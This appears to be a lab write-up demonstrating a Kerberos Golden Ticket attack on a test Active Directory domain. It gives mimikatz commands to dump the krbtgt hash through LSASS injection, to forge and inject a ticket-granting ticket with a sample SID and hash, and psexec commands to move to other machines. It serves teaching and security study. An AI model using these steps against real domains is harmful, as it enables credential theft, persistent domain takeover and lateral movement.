# Golden Ticket LAB DEMO

Since Golden Ticket is a post compromise attack, we need to have valid credentials of a domain user preferably admin. We already compromised the Administrator using the previous attacks and we can get a shell on JUSTICE-DC using his credentials.

For a successful Golden ticket, first thing we need to compromise is the `krbtgt` account. Once we get the shell, we can load `mimikatz` tool to dump the NTLM hashes and other  useful information about this account.

### STEP 1: COMPROMISE KRBTGT ACCOUNT

To begin a Golden ticket attack, we need to gain control over the KDC which means we need to find the credentials and compromise `KRBTGT` account.

We mainly need two details, first the NTLM hash of `KRBTGT` account and then the Service ID (SID) of the domain. We will use `mimikatz` to extract this information out of DC.

```bash
lsadump::lsa /inject /name:krbtgt
```

`lsadump::lsa` : LSA Server to retrieve SAM/AD hashes
`/inject` : Inject LSASS to extract credentials
`/name` : account name for target user account

#### STEP 2: FORGE KERBEROS TICKETS:

After compromising the `krbtgt` password hash, we can use it to create forged Kerberos tickets. For the attack we will create a Kerberos ticket-granting ticket (TGT) for a user account that doesn’t actually exist in the directory.

```bash
kerberos::golden /user:fakeuser /domain:HERO.local /sid:S-1-5-21-3383309996-1560293891-592623117 /krbtgt:650c0550568e8c32aacbb2b4e4229fda /id:500 /ptt
```

`/user:`  The username to be impersonated (can be a fake one)
`/domain:` The FQDN of the target domain
`/sid:`  the SID of the domain
`/krbtgt:` the NTLM hash for the domain KDC service account (KRBTGT)
`/id:` the user RID. use 500 for administrator
`/ptt` stands for pass the ticket. Indicates that the forged ticket should be injected into the current session instead of being written to a file.

### STEP 3: USING THE FORGED TICKETS:

After generating a ticket, we can open a new CMD with the privileges of the forget ticket using the following command and we can use it to access all other machines on the domain. 

```bash
misc::cmd
```

We can also use tools like `psexec`,  use it to gain a shell to any other machine and run commands on that machine. The following command will allow to remotely connect to BATMAN machine and execute commands on it from our local machine.

```bash
psexec.exe //BATMAN cmd.exe
```
